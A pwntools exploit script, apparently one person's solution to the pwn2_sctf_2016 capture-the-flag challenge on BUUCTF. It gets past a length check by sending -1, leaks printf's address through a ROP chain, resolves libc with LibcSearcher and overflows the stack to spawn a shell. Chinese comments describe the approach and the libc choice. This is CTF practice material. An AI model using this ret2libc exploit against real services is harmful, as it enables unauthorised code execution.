from pwn import *
from LibcSearcher import *

context.os = "linux"
context.arch = "i386"
context.log_level = "debug"

'''
这题有个do_thing()函数触发系统调用，但是找不到控制eax的rop，所以利用不了
于是最终的解决方法还是用Printf泄露printf got表地址，然后找Libc
'''

e = ELF("./pwn2_sctf_2016")
printfPlt = e.plt["printf"]
printfGot = e.got["printf"]
formatStr = 0x80486f8
vulnFunc = 0x804852f

p = remote("node4.buuoj.cn", 26244)

p.recvuntil("read? ")
p.sendline(b'-1')

p.recvuntil(b'data!\n')

payload1 = b'a'*(0x2c+4)+p32(printfPlt)+p32(vulnFunc)+p32(formatStr)+p32(printfGot)

p.sendline(payload1)

p.recvline()

p.recvuntil(b"said: ")
printfAddr = u32(p.recv(4))

p.success(hex(printfAddr))

lbc = LibcSearcher("printf", printfAddr)

'''
[+] 0xf7dd4020
Multi Results:
 0: archive-old-glibc (id libc6_2.9-4ubuntu6_amd64)
 1: archive-old-eglibc (id libc6-i386_2.13-20ubuntu5.3_amd64)
 2: archive-glibc (id libc6-amd64_2.23-0ubuntu10_i386)
 3: archive-old-glibc (id libc6_2.8~20080505-0ubuntu9_amd64)
 4: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
 5: archive-old-glibc (id libc6-amd64_2.8~20080505-0ubuntu7_i386)
 6: archive-old-glibc (id libc6_2.8~20080505-0ubuntu7_amd64)
 7: archive-old-eglibc (id libc6-i386_2.13-20ubuntu5_amd64)
 8: archive-old-eglibc (id libc6-i386_2.11.1-0ubuntu7.11_amd64)
 9: archive-old-glibc (id libc6-amd64_2.3.6-0ubuntu20.6_i386)
10: archive-old-glibc (id libc6_2.7-10ubuntu3_i386)
11: archive-glibc (id libc6_2.28-0ubuntu1_i386)
12: archive-old-glibc (id libc6-amd64_2.8~20080505-0ubuntu9_i386)
13: archive-old-glibc (id libc6-amd64_2.9-4ubuntu6_i386)
14: archive-old-eglibc (id libc6-i386_2.17-93ubuntu4_amd64)

我直接选中了 4，然后就对了...
'''


offset = printfAddr - lbc.dump("printf")
system = offset + lbc.dump("system")
binshstr = offset + lbc.dump("str_bin_sh")

payload2 = b'a'*(0x2c+4)+p32(system) + p32(0xbaddcafe) + p32(binshstr)

p.recvuntil("read? ")
p.sendline(b'-1')

p.recvuntil("data!\n")
p.sendline(payload2)

p.interactive()